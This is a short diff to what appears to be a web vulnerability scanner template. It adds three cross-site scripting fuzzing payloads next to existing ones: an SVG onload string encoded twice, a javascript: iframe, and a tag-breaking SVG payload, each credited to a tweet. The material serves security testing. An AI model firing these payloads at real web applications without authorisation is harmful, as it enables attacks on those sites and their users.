@@ -29,6 +29,9 @@ http:
         - '"<img/src/onerror=alert(0)"@xss.com'   #https://twitter.com/bug_vs_me/status/1635006251108294656
         - '"mitsec<form/><!><details/open/ontoggle=alert(document.domain)>"@gmail.com'    #https://twitter.com/ynsmroztas/status/1635026291140468736
         - '+441134960000;phone-context=<script>alert(1)</script>'   #https://twitter.com/intigriti/status/1604054094808760321
+        - '%2522%253E%253CsVg%252FOnLuFy%253D%2522X%253Dy%2522oNloaD%253D%253B1%255Econfirm%25281%2529%253E'  #https://twitter.com/MeAsHacker_HNA/status/1663070164353523712
+        - '<iframe src="javascript:alert(document.domain)"/>'   #https://twitter.com/ehsayaan/status/1663202463275704321
+        - '"><svg/onload=alert(1)//'    #https://twitter.com/ehsayaan/status/1663202463275704321
 
     fuzzing:
       - part: query
